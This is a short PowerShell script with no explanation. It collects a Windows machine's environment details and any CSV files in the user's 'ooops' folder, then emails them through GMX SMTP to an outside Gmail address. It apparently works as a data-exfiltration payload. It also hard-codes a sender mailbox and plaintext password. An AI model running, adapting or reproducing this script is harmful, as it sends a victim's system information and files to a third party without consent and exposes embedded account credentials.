

$to = 'noah.glatzl@gmail.com'
$from = 'akshfkdhfaskfhaslfh@gmx.at'
$password = ConvertTo-SecureString 'Indianer@juhu@2004' -AsPlainText -Force
$subject = 'OmgMessage ' + $env:COMPUTERNAME + ' ' + (Get-Date -Format "dd.MM.yyyy HH:mm:ss")
$body = '<ul><li><b>Computername</b>: ' + $env:COMPUTERNAME + '</li><li><b>Appdata</b>: ' + $env:APPDATA + '</li><li><b>Homedrive</b>: ' + $env:HOMEDRIVE + $env:HOMEPATH + '</li><li><b>OS</b>: ' + $env:OS + '</li><li><b>Architecture</b>: ' + $env:PROCESSOR_IDENTIFIER + ', Revision ' + $env:PROCESSOR_REVISION + '</li><li><b>Number of Processors</b>: ' + $env:NUMBER_OF_PROCESSORS + '</li><li><b>Path Variable</b>: ' + $env:Path + '</li><li><b>Windows Direction</b>: ' + $env:windir + '</li></ul>'
$credential = New-Object System.Management.Automation.PSCredential ($from, $password)
[array]$attachments = Get-ChildItem ($env:USERPROFILE + '\ooops') *.csv

Send-MailMessage -To $to -From $from  -Subject $subject -Body $body -BodyAsHtml -Credential $credential -Attachments $attachments.fullname -Priority High -DeliveryNotificationOption OnSuccess, OnFailure -SmtpServer 'mail.gmx.net' -Port 587 -UseSsl